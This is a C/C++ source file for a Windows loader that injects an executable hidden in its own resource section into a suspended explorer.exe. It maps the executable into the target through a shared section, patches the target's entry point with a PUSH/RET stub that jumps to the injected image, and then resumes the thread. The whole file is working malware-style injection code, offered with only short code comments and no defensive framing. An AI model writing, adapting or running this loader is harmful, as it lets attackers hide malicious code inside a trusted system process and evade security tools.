#include <stdio.h>
#include "helper.h"
#include <windows.h>
#include <wdbgexts.h>
#include "resource.h"

int main()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	PROCESS_BASIC_INFORMATION pbi;
	DWORD oldProtection = NULL;
	LPVOID lpHeaderBuffer[2048];

	const unsigned int pebSize = sizeof(PEB);
	const unsigned int baseAddrLength = 4;
	const unsigned int pebImageBaseAddrOffset = 8;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	HINSTANCE handleNtDll = LoadLibrary("ntdll");

	FARPROC fpNtQueryInformationProcess = GetProcAddress(handleNtDll, "NtQueryInformationProcess");
	FARPROC fpZwUnmapViewOfSection = GetProcAddress(handleNtDll, "ZwUnmapViewOfSection");
	FARPROC fpZwCreateSection = GetProcAddress(handleNtDll, "ZwCreateSection");
	FARPROC fpZwMapViewOfSection = GetProcAddress(handleNtDll, "ZwMapViewOfSection");

	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
	_ZwUnmapViewOfSection ZwUnmapViewOfSection = (_ZwUnmapViewOfSection)fpZwUnmapViewOfSection;
	_ZwCreateSection ZwCreateSection = (_ZwCreateSection)fpZwCreateSection;
	_ZwMapViewOfSection ZwMapViewOfSection = (_ZwMapViewOfSection)fpZwMapViewOfSection;

	if (!CreateProcess("C:\\Windows\\System32\\explorer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		printf("CreateProcess Failed %i.\n", GetLastError());
	}


	/* Retrieves ProcessBasicInformaton info from the created process */
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

	/* Retrieves PEB info of the created process */
	PPEB pPeb = new PEB();
	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, pPeb, sizeof(PEB), 0);

	/* Find and load exe stored in the PE's resource section */
	HRSRC resc = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	HGLOBAL rescData = LoadResource(NULL, resc);

	/* Get pointer to the resource base address */
	LPVOID lpmyResc = LockResource(rescData);


	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpmyResc;

	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("Failed: .exe does not have a valid signature %i", GetLastError());
	}

	PIMAGE_NT_HEADERS pNTHeaderResource = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + (DWORD)pDosHeader->e_lfanew);

	HANDLE secHandle = NULL;

	LARGE_INTEGER pLargeInt;
	pLargeInt.QuadPart = pNTHeaderResource->OptionalHeader.SizeOfImage;

	/* Retrieve the size of the exe that is to be injected */
	SIZE_T commitSize = SizeofResource(NULL, resc);

	SIZE_T viewSizeCreatedPrcess = 0;

	PVOID sectionBaseAddressCreatedProcess = NULL;

	/* Create the section object which will be shared by both the current and created process */
	ZwCreateSection(&secHandle, SECTION_ALL_ACCESS, NULL, &pLargeInt, PAGE_EXECUTE_WRITECOPY, SEC_COMMIT, NULL);

	/* Map the created section into the created process's virtual address space */
	ZwMapViewOfSection(secHandle, pi.hProcess, &sectionBaseAddressCreatedProcess, NULL, NULL, NULL, &viewSizeCreatedPrcess, ViewShare, NULL, PAGE_EXECUTE_WRITECOPY);


	PBYTE pHeader = new BYTE[pNTHeaderResource->OptionalHeader.SizeOfHeaders];

	memcpy(pHeader, pDosHeader, pNTHeaderResource->OptionalHeader.SizeOfHeaders);

	if (!WriteProcessMemory(pi.hProcess, sectionBaseAddressCreatedProcess, lpmyResc, commitSize, NULL))
	{
		printf("Failed wrting resource:  %i", GetLastError());
		return -1;
	}


	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNTHeaderResource);


	/* Retrieve the PEB associated with the created process */
	ReadProcessMemory(pi.hProcess, pPeb->ImageBaseAddress, lpHeaderBuffer, pebSize, NULL);

	PIMAGE_DOS_HEADER pDosHeaderCreatedProcess = (PIMAGE_DOS_HEADER)(LPVOID)lpHeaderBuffer;

	if (pDosHeaderCreatedProcess->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("Failed: .exe does not have a valid signature %i", GetLastError());
	}

	PIMAGE_NT_HEADERS pNTHeaderCreatedProcess = (PIMAGE_NT_HEADERS)((DWORD)pDosHeaderCreatedProcess + (DWORD)pDosHeaderCreatedProcess->e_lfanew);

	/*
		0x68       PUSH DWORD
		0x00000000 <MAPPED SECTION BASE ADDRESS>
		0xc3       RET

	*/
	BYTE opCodeBuffer[6] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };

	VirtualProtectEx(
		pi.hProcess,
		(LPVOID)((DWORD)pPeb->ImageBaseAddress + (DWORD)pNTHeaderCreatedProcess->OptionalHeader.AddressOfEntryPoint),
		sizeof(opCodeBuffer),
		PAGE_EXECUTE_READWRITE,
		&oldProtection
	);

	/* Copy the section base address into the buffer containing the opcode*/
	memcpy(opCodeBuffer + 1, &sectionBaseAddressCreatedProcess, 4);

	WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pPeb->ImageBaseAddress + (DWORD)pNTHeaderCreatedProcess->OptionalHeader.AddressOfEntryPoint), opCodeBuffer, sizeof(opCodeBuffer), NULL);

	VirtualProtectEx(
		pi.hProcess,
		(LPVOID)((DWORD)pPeb->ImageBaseAddress + (DWORD)pNTHeaderCreatedProcess->OptionalHeader.AddressOfEntryPoint),
		sizeof(opCodeBuffer),
		oldProtection,
		&oldProtection
	);

	printf("Created Process id: %i\n", pi.dwProcessId);
	printf("Created Process Image Base Address: %x\n", pPeb->ImageBaseAddress);
	printf("Injected process Image Base Address 0x%x\n", sectionBaseAddressCreatedProcess);


	/* Resume the created processes main thread with the updated OEP */
	ResumeThread(pi.hThread);


	return 0;
}